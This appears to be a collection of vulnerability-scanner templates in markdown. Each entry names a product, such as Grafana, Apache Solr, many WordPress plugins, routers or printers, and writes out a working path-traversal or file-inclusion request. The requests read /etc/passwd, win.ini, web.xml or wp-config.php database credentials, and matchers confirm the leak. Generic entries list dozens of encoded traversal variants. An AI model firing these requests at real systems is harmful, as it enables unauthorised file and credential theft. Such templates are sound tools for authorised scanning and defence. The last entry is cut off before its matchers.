# Schneider Electric Pelco VideoXpert Core Admin Portal - Directory Traversal

## Description

- Pelco VideoXpert suffers from a directory traversal vulnerability. Exploiting this issue will allow an unauthenticated attacker to view arbitrary files within the context of the web server.
- severity - high
- tags - schneider,pelco,packetstorm,lfi,videoxpert

## Requests

- Method - GET

### URL

- {{BaseURL}}/portal//..\\\..\\\..\\\..\\\windows\win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - status**

- status
  1. 200

---

# Seeyon WooYun - Local File Inclusion

## Description

- Seeyon WooYun allows remote attackers to include the content of locally stored content and disclose it back to the attacker via local file inclusion.
- severity - high
- tags - seeyon,wooyun,lfi,zhiyuan

## Requests

- Method - GET

### URL

- {{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<servlet-name>NCInvokerServlet\</servlet-name>
- part - body

**Type - word**

- part - header
- words
  1. application/xml

---

# Grafana 8.x - Local File Inclusion

## Description

- Grafana 8.x is vulnerable to local file inclusion.
- severity - high
- tags - grafana,lfi,fuzz

## Requests

- Method - GET

### URL

- {{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

**Payloads**- pluginSlug

---

# Apache Solr \<= 8.8.1 - Local File Inclusion

## Description

- Apache Solr versions prior to and including 8.8.1 are vulnerable to local file inclusion.
- severity - high
- tags - apache,solr,lfi

## Requests

### Step - 1

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```

### Step - 2

```
GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

### Extractors

**Type - regex**

- internal - True
- name - core
- group - 1
- regex
  1. "name"\:"(.\*?)"

---

# Ecology - Local File Inclusion

## Description

- Ecology is vulnerable to local file inclusion.
- severity - high
- tags - ecology,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<url-pattern>/weaver/
- part - body

---

# Ecology Springframework - Local File Inclusion

## Description

- Ecology Springframework is vulnerable to local file inclusion.
- severity - high
- tags - ecology,springframework,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<url-pattern>/weaver/
- part - body

---

# Ruijie Networks Switch eWeb S29_RGOS 11.4 - Local File Inclusion

## Description

- Ruijie Networks Switch eWeb S29_RGOS 11.4 is vulnerable to local file inclusion and allows remote unauthenticated attackers to access locally stored files and retrieve their content via the 'download.do' endpoint.
- severity - high
- tags - ruijie,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/download.do?file=../../../../config.text

### Matchers

**Type - word**

- words
  1. filename="config.text"
  2. Content-Type: application/octet-stream
- part - header

**Type - word**

- words
  1. version S29_RGOS 11.4
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Oracle eBusiness Suite - Improper File Access

## Description

- Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes.

- severity - critical
- tags - oracle,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
- {{BaseURL}}/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

# WordPress Aspose PDF Exporter - Local File Inclusion

## Description

- WordPress Aspose PDF Exporter is vulnerable to local file inclusion.
- severity - high
- tags - aspose,packetstorm,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Diarise 1.5.9 - Arbitrary File Retrieval

## Description

- WordPress Diarise theme version 1.5.9 suffers from a local file retrieval vulnerability.
- severity - high
- tags - packetstorm,wordpress,wp-theme,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Health Check & Troubleshooting \<1.24 - Local File Inclusion

## Description

- WordPress Health Check & Troubleshooting prior to 1.2.4 is vulnerable to local file inclusion. Exploitation does require authentication.
- severity - high
- tags - lfi,wp,wordpress,wp-plugin,authenticated,lfr,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=health-check-view-file-diff&file=../../../../../../etc/passwd

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# WordPress Amministrazione Aperta 3.7.3 - Local File Inclusion

## Description

- WordPress Amministrazione Aperta 3.7.3 is vulnerable to local file inclusion.
- severity - high
- tags - wp-plugin,lfi,wp,edb,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Wordpress HB Audio Gallery Lite - Local File Inclusion

## Description

- Wordpress HB Audio Gallery Lite is vulnerable to local file inclusion.
- severity - high
- tags - wp,packetstorm,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Memphis Document Library 3.1.5 - Local File Inclusion

## Description

- WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion.
- severity - high
- tags - wpscan,wordpress,wp-plugin,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
- {{BaseURL}}/?mdocs-img-preview=../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Simple Fields 0.2 - 0.3.5 LFI/RFI/RCE

## Description

- WordPress Simple Fields 0.2 is vulnerable to local file inclusion, remote file inclusion, and remote code execution.
- severity - high
- tags - wp-plugin,lfi,packetstorm,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# WordPress Brandfolder - Open Redirect (RFI & LFI)

## Description

- WordPress Brandfolder is vulnerable to remote/local file inclusion and allows remote attackers to inject an arbitrary URL into the 'callback.php' endpoint via the 'wp_abspath' parameter which will redirect the victim to it.

- severity - medium
- tags - wp,brandfolder,edb,wpscan,wp-plugin,redirect,rfi,wordpress,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# Wordpress Brandfolder - Remote/Local File Inclusion

## Description

- WordPress Brandfolder allows remote attackers to access arbitrary files that reside on the local and remote server and disclose their content.
- severity - high
- tags - lfi,rfi,edb,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress NativeChurch Theme - Local File Inclusion

## Description

- WordPress NativeChurch Theme is vulnerable to local file inclusion in the download.php file.

- severity - high
- tags - wp-theme,lfi,wp,packetstorm,wpscan,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
  3. DB_HOST
  4. The base configurations of the WordPress
- condition - and

---

# WordPress Hide Security Enhancer 1.3.9.2 Local File Inclusion

## Description

- WordPress Hide Security Enhancer version 1.3.9.2 or less is susceptible to a local file inclusion vulnerability which could allow malicious visitors to download any file in the installation.
- severity - high
- tags - wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&file_path=/wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Wordpress Plugin Issuu Panel Remote/Local File Inclusion

## Description

- The WordPress Issuu Plugin includes an arbitrary file disclosure vulnerability that allows unauthenticated attackers to disclose the content of local and remote files.
- severity - high
- tags - wp-plugin,wordpress,lfi,rfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Javo Spot Premium Theme - Local File Inclusion

## Description

- WordPress Javo Spot Premium Theme is vulnerable to local file inclusion that allows remote unauthenticated attackers access to locally stored file and return their content.
- severity - high
- tags - wordpress,wp-theme,lfi,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress ChurcHope Theme \<= 2.1 - Local File Inclusion

## Description

- WordPress ChurcHope Theme \<= 2.1 is susceptible to local file inclusion. The vulnerability is caused by improper filtration of user-supplied input passed via the 'file' HTTP GET parameter to the '/lib/downloadlink.php' script, which is publicly accessible.
- severity - high
- tags - wp,wpscan,wordpress,wp-theme,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Advanced Access Manager \< 5.9.9 - Local File Inclusion

## Description

- WordPress Advanced Access Manager versions before 5.9.9 are vulnerable to local file inclusion and allows attackers to download the wp-config.php file and get access to the database, which is publicly reachable on many servers.

- severity - high
- tags - wordpress,wp-plugin,lfi,wp,accessmanager,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/?aam-media=wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Aspose Importer & Exporter 1.0 - Local File Inclusion

## Description

- WordPress Aspose Importer & Exporter version 1.0 is vulnerable to local file inclusion.
- severity - high
- tags - aspose,packetstorm,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Download Shortcode 0.2.3 - Local File Inclusion

## Description

- WordPress Download Shortcode 0.2.3 is prone to a local file inclusion vulnerability because it fails to sufficiently sanitize user-supplied input. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks. Prior versions may also be affected.
- severity - high
- tags - lfi,shortcode,wp,packetstorm,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/force-download.php?file=../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress tutor 1.5.3 - Local File Inclusion

## Description

- WordPress tutor.1.5.3 is vulnerable to local file inclusion.
- severity - high
- tags - wordpress,wp-plugin,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Product Input Fields for WooCommerce \< 1.2.7 - Unauthenticated File Download

## Description

- WordPress WooCommerce \< 1.2.7 is susceptible to file download vulnerabilities. The lack of authorization checks in the handle_downloads() function hooked to admin_init() could allow unauthenticated users to download arbitrary files from the blog using a path traversal payload.

- severity - high
- tags - wordpress,woocommerce,lfi,wp-plugin,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Oxygen-Theme - Local File Inclusion

## Description

- WordPress Oxygen-Theme has a local file inclusion vulnerability via the 'file' parameter of 'download.php'.
- severity - high
- tags - wordpress,wp-theme,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Wordfence 7.4.5 - Local File Inclusion

## Description

- WordPress Wordfence 7.4.5 is vulnerable to local file inclusion.
- severity - high
- tags - wordpress,wp-plugin,lfi,wordfence,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WordPress Church Admin 0.33.2.1 - Local File Inclusion

## Description

- WordPress Church Admin 0.33.2.1 is vulnerable to local file inclusion via the "key" parameter of plugins/church-admin/display/download.php.
- severity - high
- tags - wordpress,wp-plugin,lfi,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Aspose Words Exporter \<2.0 - Local File Inclusion

## Description

- WordPress Aspose Words Exporter prior to version 2.0 is vulnerable to local file inclusion.
- severity - high
- tags - wordpress,wp-plugin,lfi,aspose,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress mTheme-Unus Theme - Local File Inclusion

## Description

- WordPress mTheme-Unus Theme is vulnerable to local file inclusion via css.php.
- severity - high
- tags - wpscan,packetstorm,wordpress,wp-theme,lfi,mtheme

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Ad Widget 2.11.0 - Local File Inclusion

## Description

- WordPress Ad Widget 2.11.0 is vulnerable to local file inclusion. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.

- severity - high
- tags - wordpress,wp-plugin,lfi,wp,adWidget,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Tinymce Thumbnail Gallery \<=1.0.7 - Local File Inclusion

## Description

- Tinymce Thumbnail Gallery 1.0.7 and before are vulnerable to local file inclusion via download-image.php.
- severity - high
- tags - wordpress,wp-theme,lfi,wordpress,tinymce

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Cherry Plugin \< 1.2.7 - Arbitrary File Retrieval and File Upload

## Description

- WordPress plugin Cherry \< 1.2.7 contains an unauthenticated file upload and download vulnerability, allowing attackers to upload and download arbitrary files. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.
- severity - high
- tags - wordpress,wp-plugin,lfi,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Wordpress Aspose Cloud eBook Generator - Local File Inclusion

## Description

- Wordpress Aspose Cloud eBook Generator is vulnerable to local file inclusion.
- severity - high
- tags - aspose,ebook,wpscan,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Cherry \< 1.2.7 - Unauthenticated Arbitrary File Upload and Download

## Description

- WordPress plugin Cherry \< 1.2.7 has a vulnerability which enables an attacker to upload files directly to the server. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.
- severity - high
- tags - wpscan,wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Vault 0.8.6.6 - Local File Inclusion

## Description

- WordPress Vault 0.8.6.6 is vulnerable to local file inclusion.
- severity - high
- tags - lfi,edb,wp-plugin,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Samsung WLAN AP WEA453e - Local File Inclusion

## Description

- Samsung WLAN AP WEA453e is susceptible to local file inclusion vulnerabilities.
- severity - high
- tags - xss,samsung,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/(download)/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. bin:.\*:1:1
- part - body

**Type - status**

- status
  1. 200

---

# Office Anywhere TongDa - Path Traversal

## Description

- Office Anywhere (OA) is susceptible to path traversal vulnerabilities which can be leveraged to perform remote code execution.

- severity - critical
- tags - tongda,lfi

## Requests

### Step - 1

```
POST /ispirit/interface/gateway.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

json={"url":"/general/../../mysql5/my.ini"}

```

### Matchers

**Type - word**

- part - body
- words
  1. [mysql]
  2. password=
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Huawei HG255s - Local File Inclusion

## Description

- Huawei HG255s is vulnerable to local file inclusion due to insufficient validation of the received HTTP requests. A remote attacker may access the local files on the device without authentication.
- severity - high
- tags - huawei,lfi,router

## Requests

- Method - GET

### URL

- {{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Webp server go - Local File Inclusion

- severity - high
- tags - lfi,webp

## Requests

- Method - GET

### URL

- {{BaseURL}}/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0

**Type - status**

- status
  1. 200

---

# IBM InfoPrint 4247-Z03 Impact Matrix Printer - Local File Inclusion

## Description

- IBM InfoPrint 4247-Z03 Impact Matrix Printer is subject to local file inclusion.
- severity - high
- tags - matrix,printer,edb,ibm,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/./../../../../../../../../../../etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Generic J2EE LFI scan

## Description

- Looks for J2EE specific LFI vulnerabilities, tries to leak the web.xml file.
- severity - high
- tags - lfi,generic,j2ee

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../../../WEB-INF/web.xml
- {{BaseURL}}/../../../WEB-INF/web.xml
- {{BaseURL}}/../../WEB-INF/web.xml
- {{BaseURL}}/%c0%ae/%c0%ae/WEB-INF/web.xml
- {{BaseURL}}/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml
- {{BaseURL}}/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml
- {{BaseURL}}/../../../WEB-INF/web.xml;x=
- {{BaseURL}}/../../WEB-INF/web.xml;x=
- {{BaseURL}}/../WEB-INF/web.xml;x=
- {{BaseURL}}/WEB-INF/web.xml
- {{BaseURL}}/.//WEB-INF/web.xml
- {{BaseURL}}/../WEB-INF/web.xml
- {{BaseURL}}/%c0%ae/WEB-INF/web.xml

### Matchers

**Type - word**

- part - body
- words
  1. \<servlet-name>
  2. \</web-app>
- condition - and

**Type - status**

- status
  1. 200

---

# Windows - Local File Inclusion

## Description

- Windows is vulnerable to local file inclusion because of searches for /windows/win.ini on passed URLs.

- severity - high
- tags - azure,windows,lfi,generic

## Requests

- Method - GET

### URL

- {{BaseURL}}/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
- {{BaseURL}}/./../../../../../../../../../../windows/win.ini
- {{BaseURL}}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini
- {{BaseURL}}/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini
- {{BaseURL}}/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini
- {{BaseURL}}/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini
- {{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
- {{BaseURL}}/?redirect=..%2f..%2f..%2f..%2fwindows/win.ini
- {{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini
- {{BaseURL}}/?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
- {{BaseURL}}/..///////..////..//////windows/win.ini
- {{BaseURL}}/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini
- {{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
- {{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00
- {{BaseURL}}/index.php?page=windows/win.ini
- {{BaseURL}}/index.php?page=windows/win.ini%00
- {{BaseURL}}/index.php?page=../../windows/win.ini
- {{BaseURL}}/index.php?page=....//....//windows/win.ini
- {{BaseURL}}/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini
- {{BaseURL}}/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini
- {{BaseURL}}/../../../../../../../../../windows/win.ini
- {{BaseURL}}/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Generic Linux - Local File Inclusion

## Description

- Generic Linux is subject to local file Inclusion on searches for /etc/passwd on passed URLs.
- severity - high
- tags - linux,lfi,generic

## Requests

- Method - GET

### URL

- {{BaseURL}}/etc/passwd
- {{BaseURL}}/..%5cetc/passwd
- {{BaseURL}}/..%5c..%5cetc/passwd
- {{BaseURL}}/..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/static/..%5cetc/passwd
- {{BaseURL}}/static/..%5c..%5cetc/passwd
- {{BaseURL}}/static/..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/static/..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/./../../../../../../../../../../etc/passwd
- {{BaseURL}}/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd
- {{BaseURL}}/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd
- {{BaseURL}}/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd
- {{BaseURL}}/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd
- {{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
- {{BaseURL}}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
- {{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
- {{BaseURL}}/..///////..////..//////etc/passwd
- {{BaseURL}}/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
- {{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
- {{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
- {{BaseURL}}/index.php?page=etc/passwd
- {{BaseURL}}/index.php?page=etc/passwd%00
- {{BaseURL}}/index.php?page=../../etc/passwd
- {{BaseURL}}/index.php?page=....//....//etc/passwd
- {{BaseURL}}/../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# SquirrelMail 1.2.11 - Local File Inclusion

## Description

- SquirrelMail 1.2.11 is vulnerable to local file inclusion.
- severity - high
- tags - lfi,squirrelmail,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/src/read_body.php?mailbox=/etc/passwd&passed_id=1&
- {{BaseURL}}/src/download.php?absolute_dl=true&passed_id=1&passed_ent_id=1&mailbox=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Groupoffice 3.4.21 - Local File Inclusion

## Description

- Groupoffice 3.4.21 is vulnerable to local file inclusion.
- severity - high
- tags - groupoffice,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/compress.php?file=../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# openSIS 5.1 - Local File Inclusion

## Description

- openSIS 5.1 is vulnerable to local file inclusion and allows attackers to obtain potentially sensitive information by executing arbitrary local scripts in the context of the web server process. This may allow the attacker to compromise the application and computer; other attacks are also possible.
- severity - high
- tags - opensis,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
